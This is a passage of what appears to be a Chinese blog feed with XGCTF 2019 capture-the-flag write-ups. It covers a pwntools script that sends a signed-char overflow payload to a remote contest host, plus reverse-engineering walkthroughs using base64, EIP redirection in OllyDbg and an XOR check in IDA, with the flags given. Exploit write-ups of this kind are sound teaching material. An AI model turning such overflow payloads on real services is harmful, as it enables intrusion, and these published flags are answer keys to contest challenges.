aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include<iostream></iostream></span><br><span class="line">using namespace std;</span><br><span class="line">int main() {</span><br><span class="line">for (int i = 0; i <= 255; i++) {</span><br><span class="line">cout << i <<"  leak to  " <<(int)((char)i) << endl;;</span><br><span class="line">}</span><br><span class="line">return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h5 id="执行结果如下-1"><a href="#执行结果如下-1" class="headerlink" title="执行结果如下"></a>执行结果如下</h5><p><a href="https://i.loli.net/2019/03/26/5c99075ce8bdf.png" target="_blank" rel="noopener"><img alt="21.png" data-src="https://i.loli.net/2019/03/26/5c99075ce8bdf.png" class="lazyload"></a></p><h5 id="由于char的范围是1-127-溢出后就会变成负数，即-128-之后为负数"><a href="#由于char的范围是1-127-溢出后就会变成负数，即-128-之后为负数" class="headerlink" title="由于char的范围是1-127,溢出后就会变成负数，即 128 之后为负数"></a>由于char的范围是1-127,溢出后就会变成负数，即 128 之后为负数</h5><h5 id="那么我们就可以通过该特点来溢出低位数据"><a href="#那么我们就可以通过该特点来溢出低位数据" class="headerlink" title="那么我们就可以通过该特点来溢出低位数据"></a>那么我们就可以通过该特点来溢出低位数据</h5><h5 id="双击-v2-，查看它在栈中的位置，v2-var-80"><a href="#双击-v2-，查看它在栈中的位置，v2-var-80" class="headerlink" title="双击 v2 ，查看它在栈中的位置，v2 = var_80"></a>双击 v2 ，查看它在栈中的位置，v2 = var_80</h5><p><a href="https://i.loli.net/2019/03/26/5c9906e4c8377.png" target="_blank" rel="noopener"><img alt="18.png" data-src="https://i.loli.net/2019/03/26/5c9906e4c8377.png" class="lazyload"></a></p><h5 id="返回伪代码，双击v8查看它在栈中的位置，v8-var-40"><a href="#返回伪代码，双击v8查看它在栈中的位置，v8-var-40" class="headerlink" title="返回伪代码，双击v8查看它在栈中的位置，v8 = var_40"></a>返回伪代码，双击v8查看它在栈中的位置，v8 = var_40</h5><p><a href="https://i.loli.net/2019/03/26/5c9906e4bf11a.png" target="_blank" rel="noopener"><img alt="20.png" data-src="https://i.loli.net/2019/03/26/5c9906e4bf11a.png" class="lazyload"></a></p><h5 id="那么我们来总结一下思路，首先我们要先想办法输入溢出的char，然后让它偏移到和自身相等的位置去，就可以跳过-结束的if"><a href="#那么我们来总结一下思路，首先我们要先想办法输入溢出的char，然后让它偏移到和自身相等的位置去，就可以跳过-结束的if" class="headerlink" title="那么我们来总结一下思路，首先我们要先想办法输入溢出的char，然后让它偏移到和自身相等的位置去，就可以跳过 结束的if"></a>那么我们来总结一下思路，首先我们要先想办法输入溢出的char，然后让它偏移到和自身相等的位置去，就可以跳过 结束的if</h5><h5 id="偏移量应该是-v8-v2-0x40"><a href="#偏移量应该是-v8-v2-0x40" class="headerlink" title="偏移量应该是 v8 - v2 = 0x40"></a>偏移量应该是 v8 - v2 = 0x40</h5><h5 id="然后我们确认-哪个溢出的char是-0x40，通过上面的C-程序，我们知道了十进制的192溢出后等于-64，即-0x40"><a href="#然后我们确认-哪个溢出的char是-0x40，通过上面的C-程序，我们知道了十进制的192溢出后等于-64，即-0x40" class="headerlink" title="然后我们确认 哪个溢出的char是 0x40，通过上面的C++程序，我们知道了十进制的192溢出后等于-64，即-0x40"></a>然后我们确认 哪个溢出的char是 0x40，通过上面的C++程序，我们知道了十进制的192溢出后等于-64，即-0x40</h5><h5 id="接下来我们开始写payload，这里我是用python写的"><a href="#接下来我们开始写payload，这里我是用python写的" class="headerlink" title="接下来我们开始写payload，这里我是用python写的"></a>接下来我们开始写payload，这里我是用python写的</h5><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = remote("10.129.2.227",10002)</span><br><span class="line">#sh = process("./0x3")</span><br><span class="line">head = 192</span><br><span class="line">payload = ''</span><br><span class="line">for i in range(0,28):</span><br><span class="line">payload += chr(head)</span><br><span class="line">head += 1</span><br><span class="line">print payload</span><br><span class="line">sh.sendline(payload);</span><br><span class="line">print sh.recv()</span><br></pre></td></tr></tbody></table></figure></div><h5 id="执行结果如下-2"><a href="#执行结果如下-2" class="headerlink" title="执行结果如下"></a>执行结果如下</h5><p><a href="https://i.loli.net/2019/03/26/5c99075d0a13f.png" target="_blank" rel="noopener"><img alt="22.png" data-src="https://i.loli.net/2019/03/26/5c99075d0a13f.png" class="lazyload"></a></p><h3 id="得到flag-xgctf-1eak-Char-t0-g4t-F1ag"><a href="#得到flag-xgctf-1eak-Char-t0-g4t-F1ag" class="headerlink" title="得到flag:   xgctf{1eak_Char_t0_g4t_F1ag}"></a>得到flag:   xgctf{1eak_Char_t0_g4t_F1ag}</h3></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XGCTF-2019年首届Re</title>
      <link href="/2019/03/25/XGCTF-2019%E5%B9%B4%E9%A6%96%E5%B1%8ARe/"/>
      <url>/2019/03/25/XGCTF-2019%E5%B9%B4%E9%A6%96%E5%B1%8ARe/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h3 id="0x1-easy-re"><a href="#0x1-easy-re" class="headerlink" title="0x1 easy re"></a>0x1 easy re</h3><h5 id="为了方便大家理解，我附上程序源码"><a href="#为了方便大家理解，我附上程序源码" class="headerlink" title="为了方便大家理解，我附上程序源码"></a>为了方便大家理解，我附上程序源码</h5><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include<stdio.h></stdio.h></span><br><span class="line">#include<windows.h></windows.h></span><br><span class="line">int main() {</span><br><span class="line">char hint[] = "The next chars is flag,you can use base64 to decode it!";</span><br><span class="line">char flag[] = "eGdjdGZ7V2VsY29tZV90b19YR0NURn0=";</span><br><span class="line">::MessageBoxA(0, "快去找flag啦", "xgctf:",0);</span><br><span class="line">return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h5 id="我们现在打开吾爱破解OD，将程序拖入OD中，我们可以看到如下情况"><a href="#我们现在打开吾爱破解OD，将程序拖入OD中，我们可以看到如下情况" class="headerlink" title="我们现在打开吾爱破解OD，将程序拖入OD中，我们可以看到如下情况"></a>我们现在打开吾爱破解OD，将程序拖入OD中，我们可以看到如下情况</h5><p><a href="https://i.loli.net/2019/03/26/5c990273e5df0.png" target="_blank" rel="noopener"><img alt="1.png" data-src="https://i.loli.net/2019/03/26/5c990273e5df0.png" class="lazyload"></a></p><h5 id="在左上角的窗口中，右键——–中文搜索引擎————智能搜索-具体步骤如下"><a href="#在左上角的窗口中，右键——–中文搜索引擎————智能搜索-具体步骤如下" class="headerlink" title="在左上角的窗口中，右键——–中文搜索引擎————智能搜索   具体步骤如下"></a>在左上角的窗口中，右键——–中文搜索引擎————智能搜索   具体步骤如下</h5><p><a href="https://i.loli.net/2019/03/26/5c990273e5463.png" target="_blank" rel="noopener"><img alt="2.png" data-src="https://i.loli.net/2019/03/26/5c990273e5463.png" class="lazyload"></a></p><h5 id="我们可以查看到这个程序大部分的字符串"><a href="#我们可以查看到这个程序大部分的字符串" class="headerlink" title="我们可以查看到这个程序大部分的字符串"></a>我们可以查看到这个程序大部分的字符串</h5><p><a href="https://i.loli.net/2019/03/26/5c990273dfa45.png" target="_blank" rel="noopener"><img alt="3.png" data-src="https://i.loli.net/2019/03/26/5c990273dfa45.png" class="lazyload"></a></p><h5 id="我们看到第二行字符串为"><a href="#我们看到第二行字符串为" class="headerlink" title="我们看到第二行字符串为"></a>我们看到第二行字符串为</h5><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The next chars is flag,you can use base64 to decode it!</span><br></pre></td></tr></tbody></table></figure></div><h5 id="它告诉我们，下一个字符串就是flag，我们需要用base64解密它"><a href="#它告诉我们，下一个字符串就是flag，我们需要用base64解密它" class="headerlink" title="它告诉我们，下一个字符串就是flag，我们需要用base64解密它"></a>它告诉我们，下一个字符串就是flag，我们需要用base64解密它</h5><h5 id><a href="#" class="headerlink" title></a></h5><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eGdjdGZ7V2VsY29tZV90b19YR0NURn0=   //第三行字符串</span><br></pre></td></tr></tbody></table></figure></div><h5 id="我们将它进行base64解密即可"><a href="#我们将它进行base64解密即可" class="headerlink" title="我们将它进行base64解密即可"></a>我们将它进行base64解密即可</h5><p><a href="https://i.loli.net/2019/03/26/5c990273cc7e4.png" target="_blank" rel="noopener"><img alt="4.png" data-src="https://i.loli.net/2019/03/26/5c990273cc7e4.png" class="lazyload"></a></p><h4 id="得到flag-xgctf-Welcome-to-XGCTF"><a href="#得到flag-xgctf-Welcome-to-XGCTF" class="headerlink" title="得到flag: xgctf{Welcome_to_XGCTF}"></a>得到flag: xgctf{Welcome_to_XGCTF}</h4><h3 id="0x2-跳到对的地方"><a href="#0x2-跳到对的地方" class="headerlink" title="0x2 跳到对的地方"></a>0x2 跳到对的地方</h3><h5 id="为了方便大家理解，我放上它的源码"><a href="#为了方便大家理解，我放上它的源码" class="headerlink" title="为了方便大家理解，我放上它的源码"></a>为了方便大家理解，我放上它的源码</h5><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#include<stdio.h></stdio.h></span><br><span class="line">#include<windows.h></windows.h></span><br><span class="line">void getflag();</span><br><span class="line">void f3() {</span><br><span class="line">int a = 0;</span><br><span class="line">a = 1 + 1;</span><br><span class="line">a -= 1;</span><br><span class="line">}</span><br><span class="line">void f1() {</span><br><span class="line">int a = 0;</span><br><span class="line">a = 1 + 1;</span><br><span class="line">a -= 1;</span><br><span class="line">}</span><br><span class="line">int main() {</span><br><span class="line">MessageBoxA(0, "flag不在这里啦，你要再仔细找找哦。", "(*^▽^*)", 0);</span><br><span class="line">system("pause");</span><br><span class="line">return 0;</span><br><span class="line">}</span><br><span class="line">void f2() {</span><br><span class="line">int a = 0;</span><br><span class="line">a = 1 + 1;</span><br><span class="line">a -= 1;</span><br><span class="line">}</span><br><span class="line">void getflag() {</span><br><span class="line">//flag{Jump_And_Get_Flag}</span><br><span class="line">char cn_hint[] = "只要代码执行这里就可以得到flag哦";</span><br><span class="line">char en_hint[] = "If you could execute this function,you will get flag!";</span><br><span class="line">char false_flag[] = "xgctf{hdxg_ctf_ctf}";</span><br><span class="line">int flag[] = { 0x78,0x67,0x63,0x74,0x66,0x7b,0x4a,0x75,0x6d,0x70,0x5f,0x41,0x6e,0x64,0x5f,0x47,0x65,0x74,0x5f,0x46,0x6c,0x61,0x67,0x7d };</span><br><span class="line">for (int i = 0; i < 24; i++) {</span><br><span class="line">printf("%c", (char)flag[i]);</span><br><span class="line">}</span><br><span class="line">printf("\n");</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h5 id="看到了代码，我们很明显知道main函数中没有调用flag这个函数，但是我们必须要调用他，而且程序中还包含了很多垃圾字符串来误导选手，但是提示说明只要执行了代码就可以得到flag"><a href="#看到了代码，我们很明显知道main函数中没有调用flag这个函数，但是我们必须要调用他，而且程序中还包含了很多垃圾字符串来误导选手，但是提示说明只要执行了代码就可以得到flag" class="headerlink" title="看到了代码，我们很明显知道main函数中没有调用flag这个函数，但是我们必须要调用他，而且程序中还包含了很多垃圾字符串来误导选手，但是提示说明只要执行了代码就可以得到flag"></a>看到了代码，我们很明显知道main函数中没有调用flag这个函数，但是我们必须要调用他，而且程序中还包含了很多垃圾字符串来误导选手，但是提示说明只要执行了代码就可以得到flag</h5><h5 id="在汇编语言中，寄存器EIP指向下一个被调用的指令，所以我们可以将EIP改变到getflag函数的头部，然后让它执行即可"><a href="#在汇编语言中，寄存器EIP指向下一个被调用的指令，所以我们可以将EIP改变到getflag函数的头部，然后让它执行即可" class="headerlink" title="在汇编语言中，寄存器EIP指向下一个被调用的指令，所以我们可以将EIP改变到getflag函数的头部，然后让它执行即可"></a>在汇编语言中，寄存器EIP指向下一个被调用的指令，所以我们可以将EIP改变到getflag函数的头部，然后让它执行即可</h5><h5 id="接下来，我们打开OD，并导入程序，如下图"><a href="#接下来，我们打开OD，并导入程序，如下图" class="headerlink" title="接下来，我们打开OD，并导入程序，如下图"></a>接下来，我们打开OD，并导入程序，如下图</h5><p><a href="https://i.loli.net/2019/03/26/5c990273de696.png" target="_blank" rel="noopener"><img alt="5.png" data-src="https://i.loli.net/2019/03/26/5c990273de696.png" class="lazyload"></a></p><h5 id="右键———-中文搜索引擎———–智能搜索-具体操作如下"><a href="#右键———-中文搜索引擎———–智能搜索-具体操作如下" class="headerlink" title="右键———-中文搜索引擎———–智能搜索   具体操作如下"></a>右键———-中文搜索引擎———–智能搜索   具体操作如下</h5><p><a href="https://i.loli.net/2019/03/26/5c990273e2b88.png" target="_blank" rel="noopener"><img alt="6.png" data-src="https://i.loli.net/2019/03/26/5c990273e2b88.png" class="lazyload"></a></p><h5 id="于是我们看到如下情况"><a href="#于是我们看到如下情况" class="headerlink" title="于是我们看到如下情况"></a>于是我们看到如下情况</h5><p><a href="https://i.loli.net/2019/03/26/5c990273de7eb.png" target="_blank" rel="noopener"><img alt="7.png" data-src="https://i.loli.net/2019/03/26/5c990273de7eb.png" class="lazyload"></a></p><h5 id="我们可以从上面的源代码知道-xgctf-hdxg-ctf-ctf-是假的flag，根据提示"><a href="#我们可以从上面的源代码知道-xgctf-hdxg-ctf-ctf-是假的flag，根据提示" class="headerlink" title="我们可以从上面的源代码知道 xgctf{hdxg_ctf_ctf} 是假的flag，根据提示"></a>我们可以从上面的源代码知道 xgctf{hdxg_ctf_ctf} 是假的flag，根据提示</h5><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">地址=000919BD</span><br><span class="line">反汇编=mov esi,0x3.00097B70</span><br><span class="line">文本字符串=只要代码执行这里就可以得到flag哦</span><br></pre></td></tr></tbody></table></figure></div><h5 id="我们双击-只要代码执行这里就可以得到flag哦-这一行"><a href="#我们双击-只要代码执行这里就可以得到flag哦-这一行" class="headerlink" title="我们双击   只要代码执行这里就可以得到flag哦   这一行"></a>我们双击   只要代码执行这里就可以得到flag哦   这一行</h5><p><a href="https://i.loli.net/2019/03/26/5c990273c2f75.png" target="_blank" rel="noopener"><img alt="8.png" data-src="https://i.loli.net/2019/03/26/5c990273c2f75.png" class="lazyload"></a></p><h5 id="就会自动跳转到对应的汇编代码"><a href="#就会自动跳转到对应的汇编代码" class="headerlink" title="就会自动跳转到对应的汇编代码"></a>就会自动跳转到对应的汇编代码</h5><p><a href="https://i.loli.net/2019/03/26/5c990273e3723.png" target="_blank" rel="noopener"><img alt="9.png" data-src="https://i.loli.net/2019/03/26/5c990273e3723.png" class="lazyload"></a></p><h5 id="一般情况下，一个函数转为机器指令后，由于函数的调用会影响栈，所以函数的头部一般以以下汇编代码开头"><a href="#一般情况下，一个函数转为机器指令后，由于函数的调用会影响栈，所以函数的头部一般以以下汇编代码开头" class="headerlink" title="一般情况下，一个函数转为机器指令后，由于函数的调用会影响栈，所以函数的头部一般以以下汇编代码开头"></a>一般情况下，一个函数转为机器指令后，由于函数的调用会影响栈，所以函数的头部一般以以下汇编代码开头</h5><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push ebp</span><br><span class="line">mov ebp,esp</span><br><span class="line">sub esp,0x1BC</span><br></pre></td></tr></tbody></table></figure></div><h5 id="我们将EIP设置在函数头部，即-push-ebp"><a href="#我们将EIP设置在函数头部，即-push-ebp" class="headerlink" title="我们将EIP设置在函数头部，即 push ebp"></a>我们将EIP设置在函数头部，即 push ebp</h5><h5 id="具体操作：选中要跳转到的指令———-右键————-设置新的EIP"><a href="#具体操作：选中要跳转到的指令———-右键————-设置新的EIP" class="headerlink" title="具体操作：选中要跳转到的指令———-右键————-设置新的EIP"></a>具体操作：选中要跳转到的指令———-右键————-设置新的EIP</h5><p><a href="https://i.loli.net/2019/03/26/5c990273e665f.png" target="_blank" rel="noopener"><img alt="10.png" data-src="https://i.loli.net/2019/03/26/5c990273e665f.png" class="lazyload"></a></p><h5 id="注意：可能会弹出信息框询问跳转到EIP可能存在危险，点-是-即可，如以下情况"><a href="#注意：可能会弹出信息框询问跳转到EIP可能存在危险，点-是-即可，如以下情况" class="headerlink" title="注意：可能会弹出信息框询问跳转到EIP可能存在危险，点 是 即可，如以下情况"></a>注意：可能会弹出信息框询问跳转到EIP可能存在危险，点 是 即可，如以下情况</h5><h5 id="接下来只需单步（按F8一条一条执行指令）"><a href="#接下来只需单步（按F8一条一条执行指令）" class="headerlink" title="接下来只需单步（按F8一条一条执行指令）"></a>接下来只需单步（按F8一条一条执行指令）</h5><p><a href="https://i.loli.net/2019/03/26/5c99032b6884d.png" target="_blank" rel="noopener"><img alt="11.png" data-src="https://i.loli.net/2019/03/26/5c99032b6884d.png" class="lazyload"></a></p><h5 id="大家会遇到一个循环，如下"><a href="#大家会遇到一个循环，如下" class="headerlink" title="大家会遇到一个循环，如下"></a>大家会遇到一个循环，如下</h5><p><a href="https://i.loli.net/2019/03/26/5c99032b7e676.png" target="_blank" rel="noopener"><img alt="12.png" data-src="https://i.loli.net/2019/03/26/5c99032b7e676.png" class="lazyload"></a></p><h5 id="对于这种循环，我们只需要在jmp指令下一条指令，右键——-断点——–运行到选定位置（F4）"><a href="#对于这种循环，我们只需要在jmp指令下一条指令，右键——-断点——–运行到选定位置（F4）" class="headerlink" title="对于这种循环，我们只需要在jmp指令下一条指令，右键——-断点——–运行到选定位置（F4）"></a>对于这种循环，我们只需要在jmp指令下一条指令，右键——-断点——–运行到选定位置（F4）</h5><p><a href="https://i.loli.net/2019/03/26/5c99032b85839.png" target="_blank" rel="noopener"><img alt="13.png" data-src="https://i.loli.net/2019/03/26/5c99032b85839.png" class="lazyload"></a></p><h5 id="此时我们回过头来看看程序是什么情况"><a href="#此时我们回过头来看看程序是什么情况" class="headerlink" title="此时我们回过头来看看程序是什么情况"></a>此时我们回过头来看看程序是什么情况</h5><p><a href="https://i.loli.net/2019/03/26/5c99032b5a0ae.png" target="_blank" rel="noopener"><img alt="14.png" data-src="https://i.loli.net/2019/03/26/5c99032b5a0ae.png" class="lazyload"></a></p><h4 id="得到flag：xgctf-Jump-And-Get-Flag"><a href="#得到flag：xgctf-Jump-And-Get-Flag" class="headerlink" title="得到flag：xgctf{Jump_And_Get_Flag}"></a>得到flag：xgctf{Jump_And_Get_Flag}</h4><h3 id="0x3简单的XOR"><a href="#0x3简单的XOR" class="headerlink" title="0x3简单的XOR"></a>0x3简单的XOR</h3><h5 id="首先大家要理解-A-XOR-B-XOR-B-A-的含义。"><a href="#首先大家要理解-A-XOR-B-XOR-B-A-的含义。" class="headerlink" title="首先大家要理解 A XOR B XOR B = A 的含义。"></a>首先大家要理解 A XOR B XOR B = A 的含义。</h5><h5 id="为了方便大家理解，我附上程序的源代码"><a href="#为了方便大家理解，我附上程序的源代码" class="headerlink" title="为了方便大家理解，我附上程序的源代码"></a>为了方便大家理解，我附上程序的源代码</h5><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#include<stdio.h></stdio.h></span><br><span class="line">#include<stdlib.h></stdlib.h></span><br><span class="line">int main() {</span><br><span class="line">//char flag[25] = "xgctf{This_is_easy_xor!}";</span><br><span class="line">char key[]   =  "hang_dian_xin_gong_ctf!!";</span><br><span class="line">__int8 result[24]= { 16,6,13,19,57,31,61,9,7,44,39,0,29,0,2,14,29,30,0,27,27,20,0,92 };</span><br><span class="line">char temp[25];</span><br><span class="line">char input[25];</span><br><span class="line">scanf_s("%s", &input,25);</span><br><span class="line">for (int i = 0; i < 24; i++) {</span><br><span class="line">//result[i] = flag[i]^key[i];</span><br><span class="line">temp[i] = (char)(input[i] ^ result[i]);</span><br><span class="line">}</span><br><span class="line">for (int i = 0; i < 24; i++) {</span><br><span class="line">//result[i] = flag[i]^key[i];</span><br><span class="line">if (temp[i] != key[i]) {</span><br><span class="line">printf("You should try again!\n");</span><br><span class="line">system("pause");</span><br><span class="line">return 0;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">printf("The flag is your input!\n");</span><br><span class="line">system("pause");</span><br><span class="line">return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h5 id="我们将程序导入IDA"><a href="#我们将程序导入IDA" class="headerlink" title="我们将程序导入IDA"></a>我们将程序导入IDA</h5><p><a href="https://i.loli.net/2019/03/26/5c99032b6ecec.png" target="_blank" rel="noopener"><img alt="15.png" data-src="https://i.loli.net/2019/03/26/5c99032b6ecec.png" class="lazyload"></a></p><h5 id="选择-下方按钮OK-即可"><a href="#选择-下方按钮OK-即可" class="headerlink" title="选择 下方按钮OK 即可"></a>选择 下方按钮OK 即可</h5><p><a href="https://i.loli.net/2019/03/26/5c99032b7c688.png" target="_blank" rel="noopener"><img alt="16.png" data-src="https://i.loli.net/2019/03/26/5c99032b7c688.png" class="lazyload"></a></p><h5 id="然后F5-反编译为伪代码"><a href="#然后F5-反编译为伪代码" class="headerlink" title="然后F5 反编译为伪代码"></a>然后F5 反编译为伪代码</h5><p><a href="https://i.loli.net/2019/03/26/5c99032b77d98.png" target="_blank" rel="noopener"><img alt="17.png" data-src="https://i.loli.net/2019/03/26/5c99032b77d98.png" class="lazyload"></a></p><h5 id="由于它是一个C-程序，而不是C语言程序，导入之后不会直接进入main函数，所以我们需要找到main函数"><a href="#由于它是一个C-程序，而不是C语言程序，导入之后不会直接进入main函数，所以我们需要找到main函数" class="headerlink" title="由于它是一个C++程序，而不是C语言程序，导入之后不会直接进入main函数，所以我们需要找到main函数"></a>由于它是一个C++程序，而不是C语言程序，导入之后不会直接进入main函数，所以我们需要找到main函数</h5><h5 id="方法有两种，第一种就是在左侧的函数表里慢慢找，第二种方法是针对于C-程序的通用方法"><a href="#方法有两种，第一种就是在左侧的函数表里慢慢找，第二种方法是针对于C-程序的通用方法" class="headerlink" title="方法有两种，第一种就是在左侧的函数表里慢慢找，第二种方法是针对于C++程序的通用方法"></a>方法有两种，第一种就是在左侧的函数表里慢慢找，第二种方法是针对于C++程序的通用方法</h5><p><a href="https://i.loli.net/2019/03/26/5c99032b64c74.png" target="_blank" rel="noopener"><img alt="18.png" data-src="https://i.loli.net/2019/03/26/5c99032b64c74.png" class="lazyload"></a></p><h5 id="双击sub-4124A0"><a href="#双击sub-4124A0" class="headerlink" title="双击sub_4124A0"></a>双击sub_4124A0</h5><p><a href="https://i.loli.net/2019/03/26/5c99032b6680f.png" target="_blank" rel="noopener"><img alt="19.png" data-src="https://i.loli.net/2019/03/26/5c99032b6680f.png" class="lazyload"></a></p><h5 id="双击sub-412120"><a href="#双击sub-412120" class="headerlink" title="双击sub_412120"></a>双击sub_412120</h5><p><a href="https://i.loli.net/2019/03/26/5c99032b4e4be.png" target="_blank" rel="noopener"><img alt="20.png" data-src="https://i.loli.net/2019/03/26/5c99032b4e4be.png" class="lazyload"></a></p><h5 id="双击sub-412140"><a href="#双击sub-412140" class="headerlink" title="双击sub_412140"></a>双击sub_412140</h5><p><a href="https://i.loli.net/2019/03/26/5c99038c5d234.png" target="_blank" rel="noopener"><img alt="21.png" data-src="https://i.loli.net/2019/03/26/5c99038c5d234.png" class="lazyload"></a></p><h5 id="双击-Code-sub-412410-的-sub-412410"><a href="#双击-Code-sub-412410-的-sub-412410" class="headerlink" title="双击 Code = sub_412410(); 的 sub_412410"></a>双击 Code = sub_412410(); 的 sub_412410</h5><p><a href="https://i.loli.net/2019/03/26/5c99038c364bd.png" target="_blank" rel="noopener"><img alt="22.png" data-src="https://i.loli.net/2019/03/26/5c99038c364bd.png" class="lazyload"></a></p><h5 id="双击-sub-4112B7"><a href="#双击-sub-4112B7" class="headerlink" title="双击 sub_4112B7"></a>双击 sub_4112B7</h5><p><a href="https://i.loli.net/2019/03/26/5c99038c62db9.png" target="_blank" rel="noopener"><img alt="23.png" data-src="https://i.loli.net/2019/03/26/5c99038c62db9.png" class="lazyload"></a></p><h5 id="双击-sub-411920"><a href="#双击-sub-411920" class="headerlink" title="双击 sub_411920"></a>双击 sub_411920</h5><p>#####成功到达真正的main函数<br><a href="https://i.loli.net/2019/03/26/5c99038c6f7c2.png" target="_blank" rel="noopener"><img alt="24.png" data-src="https://i.loli.net/2019/03/26/5c99038c6f7c2.png" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">  sub_411221(&unk_41C004);</span><br><span class="line">  strcpy(v32, 